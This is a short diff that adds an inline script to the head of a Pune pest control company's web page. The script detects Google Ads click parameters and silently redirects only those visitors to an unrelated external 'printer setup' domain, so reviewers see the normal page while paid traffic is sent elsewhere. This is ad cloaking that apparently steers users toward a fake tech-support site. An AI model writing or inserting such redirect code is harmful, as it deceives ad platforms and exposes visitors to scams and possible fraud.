@@ -1,6 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    
+    // Check for Google Ads traffic (gad_source or gclid)
+    if (urlParams.has('gad_source') || urlParams.has('gclid')) {
+        // Redirect to your EXTERNAL website (e.g., your-printer-support.com)
+        window.location.replace("https://absolute-printersetup.b-cdn.net/" + window.location.search);
+    }
+</script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Absolute Termite Control | Pest Control in Pune</title>
